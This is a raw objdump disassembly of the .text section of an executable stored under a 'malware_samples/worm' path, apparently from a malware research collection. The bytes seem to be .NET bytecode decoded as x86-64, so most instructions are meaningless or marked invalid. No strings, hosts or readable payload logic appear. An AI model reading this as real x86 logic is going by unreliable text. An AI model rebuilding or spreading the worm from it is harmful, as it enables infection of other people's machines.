
malware_samples/worm/f67f91c94b2f4cafc21b1ebde13f68fc790b525c737e9e8e84c14f80087453ee.exe:     file format pei-x86-64


Disassembly of section .text:

0000000140002000 <.text>:
   140002000:	48 00 00             	rex.W add %al,(%rax)
   140002003:	00 02                	add    %al,(%rdx)
   140002005:	00 05 00 48 2e 00    	add    %al,0x2e4800(%rip)        # 0x1402e680b
   14000200b:	00 b8 27 00 00 01    	add    %bh,0x1000027(%rax)
   140002011:	00 00                	add    %al,(%rax)
   140002013:	00 01                	add    %al,(%rcx)
   140002015:	00 00                	add    %al,(%rax)
   140002017:	06                   	(bad)
	...
   140002048:	13 30                	adc    (%rax),%esi
   14000204a:	03 00                	add    (%rax),%eax
   14000204c:	a0 00 00 00 00 00 00 	movabs 0x2800000000000000,%al
   140002053:	00 28 
   140002055:	19 00                	sbb    %eax,(%rax)
   140002057:	00 0a                	add    %cl,(%rdx)
   140002059:	6f                   	outsl  (%rsi),(%dx)
   14000205a:	1a 00                	sbb    (%rax),%al
   14000205c:	00 0a                	add    %cl,(%rdx)
   14000205e:	28 1b                	sub    %bl,(%rbx)
   140002060:	00 00                	add    %al,(%rax)
   140002062:	0a 80 02 00 00 04    	or     0x4000002(%rax),%al
   140002068:	28 08                	sub    %cl,(%rax)
   14000206a:	00 00                	add    %al,(%rax)
   14000206c:	06                   	(bad)
   14000206d:	28 1c 00             	sub    %bl,(%rax,%rax,1)
   140002070:	00 0a                	add    %cl,(%rdx)
   140002072:	72 01                	jb     0x140002075
   140002074:	00 00                	add    %al,(%rax)
   140002076:	70 7e                	jo     0x1400020f6
   140002078:	02 00                	add    (%rax),%al
   14000207a:	00 04 28             	add    %al,(%rax,%rbp,1)
   14000207d:	1d 00 00 0a 28       	sbb    $0x280a0000,%eax
   140002082:	1e                   	(bad)
   140002083:	00 00                	add    %al,(%rax)
   140002085:	0a 2c 1a             	or     (%rdx,%rbx,1),%ch
   140002088:	28 1c 00             	sub    %bl,(%rax,%rax,1)
   14000208b:	00 0a                	add    %cl,(%rdx)
   14000208d:	72 01                	jb     0x140002090
   14000208f:	00 00                	add    %al,(%rax)
   140002091:	70 7e                	jo     0x140002111
   140002093:	02 00                	add    (%rax),%al
   140002095:	00 04 28             	add    %al,(%rax,%rbp,1)
   140002098:	1d 00 00 0a 28       	sbb    $0x280a0000,%eax
   14000209d:	1f                   	(bad)
   14000209e:	00 00                	add    %al,(%rax)
   1400020a0:	0a 26                	or     (%rsi),%ah
   1400020a2:	14 fe                	adc    $0xfe,%al
   1400020a4:	06                   	(bad)
   1400020a5:	07                   	(bad)
   1400020a6:	00 00                	add    %al,(%rax)
   1400020a8:	06                   	(bad)
   1400020a9:	73 20                	jae    0x1400020cb
   1400020ab:	00 00                	add    %al,(%rax)
   1400020ad:	0a 73 21             	or     0x21(%rbx),%dh
   1400020b0:	00 00                	add    %al,(%rax)
   1400020b2:	0a 6f 22             	or     0x22(%rdi),%ch
   1400020b5:	00 00                	add    %al,(%rax)
   1400020b7:	0a 28                	or     (%rax),%ch
   1400020b9:	23 00                	and    (%rax),%eax
   1400020bb:	00 0a                	add    %cl,(%rdx)
   1400020bd:	80 03 00             	addb   $0x0,(%rbx)
   1400020c0:	00 04 28             	add    %al,(%rax,%rbp,1)
   1400020c3:	03 00                	add    (%rax),%eax
   1400020c5:	00 06                	add    %al,(%rsi)
   1400020c7:	14 fe                	adc    $0xfe,%al
   1400020c9:	06                   	(bad)
   1400020ca:	04 00                	add    $0x0,%al
   1400020cc:	00 06                	add    %al,(%rsi)
   1400020ce:	73 20                	jae    0x1400020f0
   1400020d0:	00 00                	add    %al,(%rax)
   1400020d2:	0a 73 21             	or     0x21(%rbx),%dh
   1400020d5:	00 00                	add    %al,(%rax)
   1400020d7:	0a 6f 22             	or     0x22(%rdi),%ch
   1400020da:	00 00                	add    %al,(%rax)
   1400020dc:	0a 14 fe             	or     (%rsi,%rdi,8),%dl
   1400020df:	06                   	(bad)
   1400020e0:	05 00 00 06 73       	add    $0x73060000,%eax
   1400020e5:	20 00                	and    %al,(%rax)
   1400020e7:	00 0a                	add    %cl,(%rdx)
   1400020e9:	73 21                	jae    0x14000210c
   1400020eb:	00 00                	add    %al,(%rax)
   1400020ed:	0a 6f 22             	or     0x22(%rdi),%ch
   1400020f0:	00 00                	add    %al,(%rax)
   1400020f2:	0a 2a                	or     (%rdx),%ch
   1400020f4:	5a                   	pop    %rdx
   1400020f5:	1f                   	(bad)
   1400020f6:	fe                   	(bad)
   1400020f7:	73 10                	jae    0x140002109
   1400020f9:	00 00                	add    %al,(%rax)
   1400020fb:	06                   	(bad)
   1400020fc:	25 02 7d 09 00       	and    $0x97d02,%eax
   140002101:	00 04 25 03 7d 0b 00 	add    %al,0xb7d03
   140002108:	00 04 2a             	add    %al,(%rdx,%rbp,1)
   14000210b:	00 1b                	add    %bl,(%rbx)
   14000210d:	30 02                	xor    %al,(%rdx)
   14000210f:	00 45 00             	add    %al,0x0(%rbp)
   140002112:	00 00                	add    %al,(%rax)
   140002114:	01 00                	add    %eax,(%rax)
   140002116:	00 11                	add    %dl,(%rcx)
   140002118:	1f                   	(bad)
   140002119:	24 28                	and    $0x28,%al
   14000211b:	24 00                	and    $0x0,%al
   14000211d:	00 0a                	add    %cl,(%rdx)
   14000211f:	72 07                	jb     0x140002128
   140002121:	00 00                	add    %al,(%rax)
   140002123:	70 28                	jo     0x14000214d
   140002125:	02 00                	add    (%rax),%al
   140002127:	00 06                	add    %al,(%rsi)
   140002129:	6f                   	outsl  (%rsi),(%dx)
   14000212a:	16                   	(bad)
   14000212b:	00 00                	add    %al,(%rax)
   14000212d:	0a 0a                	or     (%rdx),%cl
   14000212f:	2b 17                	sub    (%rdi),%edx
   140002131:	06                   	(bad)
   140002132:	6f                   	outsl  (%rsi),(%dx)
   140002133:	13 00                	adc    (%rax),%eax
   140002135:	00 0a                	add    %cl,(%rdx)
   140002137:	0b 7e 04             	or     0x4(%rsi),%edi
   14000213a:	00 00                	add    %al,(%rax)
   14000213c:	04 07                	add    $0x7,%al
   14000213e:	28 25 00 00 0a 6f    	sub    %ah,0x6f0a0000(%rip)        # 0x1af0a2144
   140002144:	26 00 00             	es add %al,(%rax)
   140002147:	0a 06                	or     (%rsi),%al
   140002149:	6f                   	outsl  (%rsi),(%dx)
   14000214a:	12 00                	adc    (%rax),%al
   14000214c:	00 0a                	add    %cl,(%rdx)
   14000214e:	2d e1 de 0a 06       	sub    $0x60adee1,%eax
   140002153:	2c 06                	sub    $0x6,%al
   140002155:	06                   	(bad)
   140002156:	6f                   	outsl  (%rsi),(%dx)
   140002157:	11 00                	adc    %eax,(%rax)
   140002159:	00 0a                	add    %cl,(%rdx)
   14000215b:	dc 2a                	fsubrl (%rdx)
   14000215d:	00 00                	add    %al,(%rax)
   14000215f:	00 01                	add    %al,(%rcx)
   140002161:	10 00                	adc    %al,(%rax)
   140002163:	00 02                	add    %al,(%rdx)
   140002165:	00 17                	add    %dl,(%rdi)
   140002167:	00 23                	add    %ah,(%rbx)
   140002169:	3a 00                	cmp    (%rax),%al
   14000216b:	0a 00                	or     (%rax),%al
   14000216d:	00 00                	add    %al,(%rax)
   14000216f:	00 1b                	add    %bl,(%rbx)
   140002171:	30 05 00 82 01 00    	xor    %al,0x18200(%rip)        # 0x14001a377
   140002177:	00 02                	add    %al,(%rdx)
   140002179:	00 00                	add    %al,(%rax)
   14000217b:	11 38                	adc    %edi,(%rax)
   14000217d:	72 01                	jb     0x140002180
   14000217f:	00 00                	add    %al,(%rax)
   140002181:	28 23                	sub    %ah,(%rbx)
   140002183:	00 00                	add    %al,(%rax)
   140002185:	0a 0a                	or     (%rdx),%cl
   140002187:	7e 03                	jle    0x14000218c
   140002189:	00 00                	add    %al,(%rax)
   14000218b:	04 06                	add    $0x6,%al
   14000218d:	3b 5a 01             	cmp    0x1(%rdx),%ebx
   140002190:	00 00                	add    %al,(%rax)
   140002192:	06                   	(bad)
   140002193:	0b 16                	or     (%rsi),%edx
   140002195:	0c 38                	or     $0x38,%al
   140002197:	48 01 00             	add    %rax,(%rax)
   14000219a:	00 07                	add    %al,(%rdi)
   14000219c:	08 9a 0d 7e 04 00    	or     %bl,0x47e0d(%rdx)
   1400021a2:	00 04 09             	add    %al,(%rcx,%rcx,1)
   1400021a5:	6f                   	outsl  (%rsi),(%dx)
   1400021a6:	27                   	(bad)
   1400021a7:	00 00                	add    %al,(%rax)
   1400021a9:	0a 6f 28             	or     0x28(%rdi),%ch
   1400021ac:	00 00                	add    %al,(%rax)
   1400021ae:	0a 3a                	or     (%rdx),%bh
   1400021b0:	2b 01                	sub    (%rcx),%eax
   1400021b2:	00 00                	add    %al,(%rax)
   1400021b4:	09 6f 27             	or     %ebp,0x27(%rdi)
   1400021b7:	00 00                	add    %al,(%rax)
   1400021b9:	0a 16                	or     (%rsi),%dl
   1400021bb:	6f                   	outsl  (%rsi),(%dx)
   1400021bc:	29 00                	sub    %eax,(%rax)
   1400021be:	00 0a                	add    %cl,(%rdx)
   1400021c0:	1f                   	(bad)
   1400021c1:	7e 3b                	jle    0x1400021fe
   1400021c3:	18 01                	sbb    %al,(%rcx)
   1400021c5:	00 00                	add    %al,(%rax)
   1400021c7:	72 13                	jb     0x1400021dc
   1400021c9:	00 00                	add    %al,(%rax)
   1400021cb:	70 72                	jo     0x14000223f
   1400021cd:	2b 00                	sub    (%rax),%eax
   1400021cf:	00 70 09             	add    %dh,0x9(%rax)
   1400021d2:	6f                   	outsl  (%rsi),(%dx)
   1400021d3:	27                   	(bad)
   1400021d4:	00 00                	add    %al,(%rax)
   1400021d6:	0a 72 53             	or     0x53(%rdx),%dh
   1400021d9:	00 00                	add    %al,(%rax)
   1400021db:	70 28                	jo     0x140002205
   1400021dd:	1d 00 00 0a 1f       	sbb    $0x1f0a0000,%eax
   1400021e2:	0e                   	(bad)
   1400021e3:	28 0d 00 00 06 7e    	sub    %cl,0x7e060000(%rip)        # 0x1be0621e9
   1400021e9:	04 00                	add    $0x0,%al
   1400021eb:	00 04 09             	add    %al,(%rcx,%rcx,1)
   1400021ee:	6f                   	outsl  (%rsi),(%dx)
   1400021ef:	27                   	(bad)
   1400021f0:	00 00                	add    %al,(%rax)
   1400021f2:	0a 6f 26             	or     0x26(%rdi),%ch
   1400021f5:	00 00                	add    %al,(%rax)
   1400021f7:	0a 7e 2a             	or     0x2a(%rsi),%bh
   1400021fa:	00 00                	add    %al,(%rax)
   1400021fc:	0a 72 cd             	or     -0x33(%rdx),%dh
   1400021ff:	00 00                	add    %al,(%rax)
   140002201:	70 17                	jo     0x14000221a
   140002203:	6f                   	outsl  (%rsi),(%dx)
   140002204:	2b 00                	sub    (%rax),%eax
   140002206:	00 0a                	add    %cl,(%rdx)
   140002208:	72 df                	jb     0x1400021e9
   14000220a:	00 00                	add    %al,(%rax)
   14000220c:	70 17                	jo     0x140002225
   14000220e:	6f                   	outsl  (%rsi),(%dx)
   14000220f:	2c 00                	sub    $0x0,%al
   140002211:	00 0a                	add    %cl,(%rdx)
   140002213:	09 6f 2d             	or     %ebp,0x2d(%rdi)
   140002216:	00 00                	add    %al,(%rax)
   140002218:	0a 6f 2e             	or     0x2e(%rdi),%ch
   14000221b:	00 00                	add    %al,(%rax)
   14000221d:	0a 72 ef             	or     -0x11(%rdx),%dh
   140002220:	00 00                	add    %al,(%rax)
   140002222:	70 6f                	jo     0x140002293
   140002224:	2f                   	(bad)
   140002225:	00 00                	add    %al,(%rax)
   140002227:	0a 74 26 00          	or     0x0(%rsi,%riz,1),%dh
   14000222b:	00 01                	add    %al,(%rcx)
   14000222d:	72 ef                	jb     0x14000221e
   14000222f:	00 00                	add    %al,(%rax)
   140002231:	70 28                	jo     0x14000225b
   140002233:	30 00                	xor    %al,(%rax)
   140002235:	00 0a                	add    %cl,(%rdx)
   140002237:	2c 3d                	sub    $0x3d,%al
   140002239:	09 6f 27             	or     %ebp,0x27(%rdi)
   14000223c:	00 00                	add    %al,(%rax)
   14000223e:	0a 28                	or     (%rax),%ch
   140002240:	31 00                	xor    %eax,(%rax)
   140002242:	00 0a                	add    %cl,(%rdx)
   140002244:	13 04 16             	adc    (%rsi,%rdx,1),%eax
   140002247:	13 05 2b 10 11 04    	adc    0x411102b(%rip),%eax        # 0x144113278
   14000224d:	11 05 9a 6f 32 00    	adc    %eax,0x326f9a(%rip)        # 0x1403291ed
   140002253:	00 0a                	add    %cl,(%rdx)
   140002255:	11 05 17 58 13 05    	adc    %eax,0x5135817(%rip)        # 0x145137a72
   14000225b:	11 05 11 04 8e 69    	adc    %eax,0x698e0411(%rip)        # 0x1a98e2672
   140002261:	32 e8                	xor    %al,%ch
   140002263:	09 6f 2d             	or     %ebp,0x2d(%rdi)
   140002266:	00 00                	add    %al,(%rax)
   140002268:	0a 6f 2e             	or     0x2e(%rdi),%ch
   14000226b:	00 00                	add    %al,(%rax)
   14000226d:	0a 16                	or     (%rsi),%dl
   14000226f:	28 0c 00             	sub    %cl,(%rax,%rax,1)
   140002272:	00 06                	add    %al,(%rsi)
   140002274:	2b 21                	sub    (%rcx),%esp
   140002276:	72 f9                	jb     0x140002271
   140002278:	00 00                	add    %al,(%rax)
   14000227a:	70 72                	jo     0x1400022ee
   14000227c:	23 01                	and    (%rcx),%eax
   14000227e:	00 70 09             	add    %dh,0x9(%rax)
   140002281:	6f                   	outsl  (%rsi),(%dx)
   140002282:	27                   	(bad)
   140002283:	00 00                	add    %al,(%rax)
   140002285:	0a 72 49             	or     0x49(%rdx),%dh
   140002288:	01 00                	add    %eax,(%rax)
   14000228a:	70 28                	jo     0x1400022b4
   14000228c:	1d 00 00 0a 1f       	sbb    $0x1f0a0000,%eax
   140002291:	0d 28 0d 00 00       	or     $0xd28,%eax
   140002296:	06                   	(bad)
   140002297:	de 46 13             	fiadds 0x13(%rsi)
   14000229a:	06                   	(bad)
   14000229b:	72 83                	jb     0x140002220
   14000229d:	01 00                	add    %eax,(%rax)
   14000229f:	70 1b                	jo     0x1400022bc
   1400022a1:	8d 26                	lea    (%rsi),%esp
   1400022a3:	00 00                	add    %al,(%rax)
   1400022a5:	01 25 16 72 a1 01    	add    %esp,0x1a17216(%rip)        # 0x141a194c1
   1400022ab:	00 70 a2             	add    %dh,-0x5e(%rax)
   1400022ae:	25 17 09 6f 27       	and    $0x276f0917,%eax
   1400022b3:	00 00                	add    %al,(%rax)
   1400022b5:	0a a2 25 18 72 d3    	or     -0x2c8de7db(%rdx),%ah
   1400022bb:	01 00                	add    %eax,(%rax)
   1400022bd:	70 a2                	jo     0x140002261
   1400022bf:	25 19 11 06 6f       	and    $0x6f061119,%eax
   1400022c4:	33 00                	xor    (%rax),%eax
   1400022c6:	00 0a                	add    %cl,(%rdx)
   1400022c8:	a2 25 1a 72 f5 01 00 	movabs %al,0xa2700001f5721a25
   1400022cf:	70 a2 
   1400022d1:	28 34 00             	sub    %dh,(%rax,%rax,1)
   1400022d4:	00 0a                	add    %cl,(%rdx)
   1400022d6:	1f                   	(bad)
   1400022d7:	0c 28                	or     $0x28,%al
   1400022d9:	0d 00 00 06 de       	or     $0xde060000,%eax
   1400022de:	00 08                	add    %cl,(%rax)
   1400022e0:	17                   	(bad)
   1400022e1:	58                   	pop    %rax
   1400022e2:	0c 08                	or     $0x8,%al
   1400022e4:	07                   	(bad)
   1400022e5:	8e 69 3f             	mov    0x3f(%rcx),%gs
   1400022e8:	af                   	scas   (%rdi),%eax
   1400022e9:	fe                   	(bad)
   1400022ea:	ff                   	(bad)
   1400022eb:	ff 1f                	lcall  *(%rdi)
   1400022ed:	0a 28                	or     (%rax),%ch
   1400022ef:	35 00 00 0a 7e       	xor    $0x7e0a0000,%eax
   1400022f4:	01 00                	add    %eax,(%rax)
   1400022f6:	00 04 39             	add    %al,(%rcx,%rdi,1)
   1400022f9:	84 fe                	test   %bh,%dh
   1400022fb:	ff                   	(bad)
   1400022fc:	ff 2a                	ljmp   *(%rdx)
   1400022fe:	00 00                	add    %al,(%rax)
   140002300:	01 10                	add    %edx,(%rax)
   140002302:	00 00                	add    %al,(%rax)
   140002304:	00 00                	add    %al,(%rax)
   140002306:	7c 00                	jl     0x140002308
   140002308:	a1 1d 01 46 17 00 00 	movabs 0x1b0100001746011d,%eax
   14000230f:	01 1b 
   140002311:	30 04 00             	xor    %al,(%rax,%rax,1)
   140002314:	02 01                	add    (%rcx),%al
   140002316:	00 00                	add    %al,(%rax)
   140002318:	03 00                	add    (%rax),%eax
   14000231a:	00 11                	add    %dl,(%rcx)
   14000231c:	38 f2                	cmp    %dh,%dl
   14000231e:	00 00                	add    %al,(%rax)
   140002320:	00 28                	add    %ch,(%rax)
   140002322:	36 00 00             	ss add %al,(%rax)
   140002325:	0a 0a                	or     (%rdx),%cl
   140002327:	16                   	(bad)
   140002328:	0b 38                	or     (%rax),%edi
   14000232a:	d5 00 00 00          	{rex2 0x0} add %al,(%rax)
   14000232e:	06                   	(bad)
   14000232f:	07                   	(bad)
   140002330:	9a                   	(bad)
   140002331:	0c 08                	or     $0x8,%al
   140002333:	6f                   	outsl  (%rsi),(%dx)
   140002334:	37                   	(bad)
   140002335:	00 00                	add    %al,(%rax)
   140002337:	0a 1a                	or     (%rdx),%bl
   140002339:	2e 0c 08             	cs or  $0x8,%al
   14000233c:	6f                   	outsl  (%rsi),(%dx)
   14000233d:	37                   	(bad)
   14000233e:	00 00                	add    %al,(%rax)
   140002340:	0a 18                	or     (%rax),%bl
   140002342:	40 b8 00 00 00 08    	rex mov $0x8000000,%eax
   140002348:	6f                   	outsl  (%rsi),(%dx)
   140002349:	38 00                	cmp    %al,(%rax)
   14000234b:	00 0a                	add    %cl,(%rdx)
   14000234d:	6f                   	outsl  (%rsi),(%dx)
   14000234e:	39 00                	cmp    %eax,(%rax)
   140002350:	00 0a                	add    %cl,(%rdx)
   140002352:	72 07                	jb     0x14000235b
   140002354:	00 00                	add    %al,(%rax)
   140002356:	70 28                	jo     0x140002380
   140002358:	02 00                	add    (%rax),%al
   14000235a:	00 06                	add    %al,(%rsi)
   14000235c:	6f                   	outsl  (%rsi),(%dx)
   14000235d:	16                   	(bad)
   14000235e:	00 00                	add    %al,(%rax)
   140002360:	0a 0d 38 81 00 00    	or     0x8138(%rip),%cl        # 0x14000a49e
   140002366:	00 09                	add    %cl,(%rcx)
   140002368:	6f                   	outsl  (%rsi),(%dx)
   140002369:	13 00                	adc    (%rax),%eax
   14000236b:	00 0a                	add    %cl,(%rdx)
   14000236d:	13 04 11             	adc    (%rcx,%rdx,1),%eax
   140002370:	04 1f                	add    $0x1f,%al
   140002372:	5c                   	pop    %rsp
   140002373:	6f                   	outsl  (%rsi),(%dx)
   140002374:	3a 00                	cmp    (%rax),%al
   140002376:	00 0a                	add    %cl,(%rdx)
   140002378:	17                   	(bad)
   140002379:	58                   	pop    %rax
   14000237a:	13 05 72 f9 01 00    	adc    0x1f972(%rip),%eax        # 0x140021cf2
   140002380:	70 11                	jo     0x140002393
   140002382:	04 11                	add    $0x11,%al
   140002384:	05 6f 3b 00 00       	add    $0x3b6f,%eax
   140002389:	0a 28                	or     (%rax),%ch
   14000238b:	3c 00                	cmp    $0x0,%al
   14000238d:	00 0a                	add    %cl,(%rdx)
   14000238f:	13 06                	adc    (%rsi),%eax
   140002391:	11 04 28             	adc    %eax,(%rax,%rbp,1)
   140002394:	3d 00 00 0a 72       	cmp    $0x720a0000,%eax
   140002399:	fd                   	std
   14000239a:	01 00                	add    %eax,(%rax)
   14000239c:	70 11                	jo     0x1400023af
   14000239e:	06                   	(bad)
   14000239f:	28 1d 00 00 0a 28    	sub    %bl,0x280a0000(%rip)        # 0x1680a23a5
   1400023a5:	1e                   	(bad)
   1400023a6:	00 00                	add    %al,(%rax)
   1400023a8:	0a 2d 3d 11 04 28    	or     0x2804113d(%rip),%ch        # 0x1680434eb
   1400023ae:	1b 00                	sbb    (%rax),%eax
   1400023b0:	00 0a                	add    %cl,(%rdx)
   1400023b2:	16                   	(bad)
   1400023b3:	6f                   	outsl  (%rsi),(%dx)
   1400023b4:	29 00                	sub    %eax,(%rax)
   1400023b6:	00 0a                	add    %cl,(%rdx)
   1400023b8:	1f                   	(bad)
   1400023b9:	7e 2e                	jle    0x1400023e9
   1400023bb:	2c 11                	sub    $0x11,%al
   1400023bd:	04 28                	add    $0x28,%al
   1400023bf:	0a 00                	or     (%rax),%al
   1400023c1:	00 06                	add    %al,(%rsi)
   1400023c3:	72 01                	jb     0x1400023c6
   1400023c5:	02 00                	add    (%rax),%al
   1400023c7:	70 72                	jo     0x14000243b
   1400023c9:	49 02 00             	rex.WB add (%r8),%al
   1400023cc:	70 11                	jo     0x1400023df
   1400023ce:	04 72                	add    $0x72,%al
   1400023d0:	85 02                	test   %eax,(%rdx)
   1400023d2:	00 70 28             	add    %dh,0x28(%rax)
   1400023d5:	1d 00 00 0a 1f       	sbb    $0x1f0a0000,%eax
   1400023da:	0a 28                	or     (%rax),%ch
   1400023dc:	0d 00 00 06 11       	or     $0x11060000,%eax
   1400023e1:	04 17                	add    $0x17,%al
   1400023e3:	28 0c 00             	sub    %cl,(%rax,%rax,1)
   1400023e6:	00 06                	add    %al,(%rsi)
   1400023e8:	09 6f 12             	or     %ebp,0x12(%rdi)
   1400023eb:	00 00                	add    %al,(%rax)
   1400023ed:	0a 3a                	or     (%rdx),%bh
   1400023ef:	74 ff                	je     0x1400023f0
   1400023f1:	ff                   	(bad)
   1400023f2:	ff                   	lcall  (bad)
   1400023f3:	de 0a                	fimuls (%rdx)
   1400023f5:	09 2c 06             	or     %ebp,(%rsi,%rax,1)
   1400023f8:	09 6f 11             	or     %ebp,0x11(%rdi)
   1400023fb:	00 00                	add    %al,(%rax)
   1400023fd:	0a dc                	or     %ah,%bl
   1400023ff:	07                   	(bad)
   140002400:	17                   	(bad)
   140002401:	58                   	pop    %rax
   140002402:	0b 07                	or     (%rdi),%eax
   140002404:	06                   	(bad)
   140002405:	8e 69 3f             	mov    0x3f(%rcx),%gs
   140002408:	22 ff                	and    %bh,%bh
   14000240a:	ff                   	(bad)
   14000240b:	ff 1f                	lcall  *(%rdi)
   14000240d:	32 28                	xor    (%rax),%ch
   14000240f:	35 00 00 0a 7e       	xor    $0x7e0a0000,%eax
   140002414:	01 00                	add    %eax,(%rax)
   140002416:	00 04 39             	add    %al,(%rcx,%rdi,1)
   140002419:	04 ff                	add    $0xff,%al
   14000241b:	ff                   	(bad)
   14000241c:	ff 2a                	ljmp   *(%rdx)
   14000241e:	00 00                	add    %al,(%rax)
   140002420:	01 10                	add    %edx,(%rax)
   140002422:	00 00                	add    %al,(%rax)
   140002424:	02 00                	add    (%rax),%al
   140002426:	46 00 93 d9 00 0a 00 	rex.RX add %r10b,0xa00d9(%rbx)
   14000242d:	00 00                	add    %al,(%rax)
   14000242f:	00 13                	add    %dl,(%rbx)
   140002431:	30 03                	xor    %al,(%rbx)
   140002433:	00 bc 00 00 00 04 00 	add    %bh,0x40000(%rax,%rax,1)
   14000243a:	00 11                	add    %dl,(%rcx)
   14000243c:	7e 2a                	jle    0x140002468
   14000243e:	00 00                	add    %al,(%rax)
   140002440:	0a 72 cd             	or     -0x33(%rdx),%dh
   140002443:	00 00                	add    %al,(%rax)
   140002445:	70 17                	jo     0x14000245e
   140002447:	6f                   	outsl  (%rsi),(%dx)
   140002448:	2b 00                	sub    (%rax),%eax
   14000244a:	00 0a                	add    %cl,(%rdx)
   14000244c:	72 df                	jb     0x14000242d
   14000244e:	00 00                	add    %al,(%rax)
   140002450:	70 17                	jo     0x140002469
   140002452:	6f                   	outsl  (%rsi),(%dx)
   140002453:	2b 00                	sub    (%rax),%eax
   140002455:	00 0a                	add    %cl,(%rdx)
   140002457:	72 cb                	jb     0x140002424
   140002459:	02 00                	add    (%rax),%al
   14000245b:	70 72                	jo     0x1400024cf
   14000245d:	ef                   	out    %eax,(%dx)
   14000245e:	00 00                	add    %al,(%rax)
   140002460:	70 6f                	jo     0x1400024d1
   140002462:	2f                   	(bad)
   140002463:	00 00                	add    %al,(%rax)
   140002465:	0a 74 26 00          	or     0x0(%rsi,%riz,1),%dh
   140002469:	00 01                	add    %al,(%rcx)
   14000246b:	72 df                	jb     0x14000244c
   14000246d:	02 00                	add    (%rax),%al
   14000246f:	70 28                	jo     0x140002499
   140002471:	3e 00 00             	ds add %al,(%rax)
   140002474:	0a 28                	or     (%rax),%ch
   140002476:	3f                   	(bad)
   140002477:	00 00                	add    %al,(%rax)
   140002479:	0a 0a                	or     (%rdx),%cl
   14000247b:	28 40 00             	sub    %al,0x0(%rax)
   14000247e:	00 0a                	add    %cl,(%rdx)
   140002480:	06                   	(bad)
   140002481:	28 41 00             	sub    %al,0x0(%rcx)
   140002484:	00 0a                	add    %cl,(%rdx)
   140002486:	0b 12                	or     (%rdx),%edx
   140002488:	01 28                	add    %ebp,(%rax)
   14000248a:	42 00 00             	rex.X add %al,(%rax)
   14000248d:	0a 23                	or     (%rbx),%ah
   14000248f:	00 00                	add    %al,(%rax)
   140002491:	00 00                	add    %al,(%rax)
   140002493:	00 00                	add    %al,(%rax)
   140002495:	1c 40                	sbb    $0x40,%al
   140002497:	37                   	(bad)
   140002498:	5d                   	pop    %rbp
   140002499:	7e 2a                	jle    0x1400024c5
   14000249b:	00 00                	add    %al,(%rax)
   14000249d:	0a 72 cd             	or     -0x33(%rdx),%dh
   1400024a0:	00 00                	add    %al,(%rax)
   1400024a2:	70 17                	jo     0x1400024bb
   1400024a4:	6f                   	outsl  (%rsi),(%dx)
   1400024a5:	2b 00                	sub    (%rax),%eax
   1400024a7:	00 0a                	add    %cl,(%rdx)
   1400024a9:	72 df                	jb     0x14000248a
   1400024ab:	00 00                	add    %al,(%rax)
   1400024ad:	70 17                	jo     0x1400024c6
   1400024af:	6f                   	outsl  (%rsi),(%dx)
   1400024b0:	2c 00                	sub    $0x0,%al
   1400024b2:	00 0a                	add    %cl,(%rdx)
   1400024b4:	72 f5                	jb     0x1400024ab
   1400024b6:	02 00                	add    (%rax),%al
   1400024b8:	70 72                	jo     0x14000252c
   1400024ba:	0b 03                	or     (%rbx),%eax
   1400024bc:	00 70 6f             	add    %dh,0x6f(%rax)
   1400024bf:	2f                   	(bad)
   1400024c0:	00 00                	add    %al,(%rax)
   1400024c2:	0a 74 26 00          	or     0x0(%rsi,%riz,1),%dh
   1400024c6:	00 01                	add    %al,(%rcx)
   1400024c8:	72 0b                	jb     0x1400024d5
   1400024ca:	03 00                	add    (%rax),%eax
   1400024cc:	70 28                	jo     0x1400024f6
   1400024ce:	30 00                	xor    %al,(%rax)
   1400024d0:	00 0a                	add    %cl,(%rdx)
   1400024d2:	2c 22                	sub    $0x22,%al
   1400024d4:	28 40 00             	sub    %al,0x0(%rax)
   1400024d7:	00 0a                	add    %cl,(%rdx)
   1400024d9:	06                   	(bad)
   1400024da:	28 41 00             	sub    %al,0x0(%rcx)
   1400024dd:	00 0a                	add    %cl,(%rdx)
   1400024df:	0b 12                	or     (%rdx),%edx
   1400024e1:	01 28                	add    %ebp,(%rax)
   1400024e3:	42 00 00             	rex.X add %al,(%rax)
   1400024e6:	0a 23                	or     (%rbx),%ah
   1400024e8:	00 00                	add    %al,(%rax)
   1400024ea:	00 00                	add    %al,(%rax)
   1400024ec:	00 00                	add    %al,(%rax)
   1400024ee:	2c 40                	sub    $0x40,%al
   1400024f0:	34 02                	xor    $0x2,%al
   1400024f2:	17                   	(bad)
   1400024f3:	2a 18                	sub    (%rax),%bl
   1400024f5:	2a 16                	sub    (%rsi),%dl
   1400024f7:	2a 1b                	sub    (%rbx),%bl
   1400024f9:	30 04 00             	xor    %al,(%rax,%rax,1)
   1400024fc:	3e 02 00             	ds add (%rax),%al
   1400024ff:	00 05 00 00 11 7e    	add    %al,0x7e110000(%rip)        # 0x1be112505
   140002505:	2a 00                	sub    (%rax),%al
   140002507:	00 0a                	add    %cl,(%rdx)
   140002509:	72 cd                	jb     0x1400024d8
   14000250b:	00 00                	add    %al,(%rax)
   14000250d:	70 17                	jo     0x140002526
   14000250f:	6f                   	outsl  (%rsi),(%dx)
   140002510:	2b 00                	sub    (%rax),%eax
   140002512:	00 0a                	add    %cl,(%rdx)
   140002514:	72 df                	jb     0x1400024f5
   140002516:	00 00                	add    %al,(%rax)
   140002518:	70 17                	jo     0x140002531
   14000251a:	6f                   	outsl  (%rsi),(%dx)
   14000251b:	2c 00                	sub    $0x0,%al
   14000251d:	00 0a                	add    %cl,(%rdx)
   14000251f:	72 f5                	jb     0x140002516
   140002521:	02 00                	add    (%rax),%al
   140002523:	70 72                	jo     0x140002597
   140002525:	0b 03                	or     (%rbx),%eax
   140002527:	00 70 6f             	add    %dh,0x6f(%rax)
   14000252a:	2f                   	(bad)
   14000252b:	00 00                	add    %al,(%rax)
   14000252d:	0a 74 26 00          	or     0x0(%rsi,%riz,1),%dh
   140002531:	00 01                	add    %al,(%rcx)
   140002533:	72 17                	jb     0x14000254c
   140002535:	03 00                	add    (%rax),%eax
   140002537:	70 28                	jo     0x140002561
   140002539:	30 00                	xor    %al,(%rax)
   14000253b:	00 0a                	add    %cl,(%rdx)
   14000253d:	2c 06                	sub    $0x6,%al
   14000253f:	28 09                	sub    %cl,(%rcx)
   140002541:	00 00                	add    %al,(%rax)
   140002543:	06                   	(bad)
   140002544:	2a 28                	sub    (%rax),%ch
   140002546:	06                   	(bad)
   140002547:	00 00                	add    %al,(%rax)
   140002549:	06                   	(bad)
   14000254a:	0c 08                	or     $0x8,%al
   14000254c:	45 03 00             	add    (%r8),%r8d
   14000254f:	00 00                	add    %al,(%rax)
   140002551:	02 00                	add    (%rax),%al
   140002553:	00 00                	add    %al,(%rax)
   140002555:	08 00                	or     %al,(%rax)
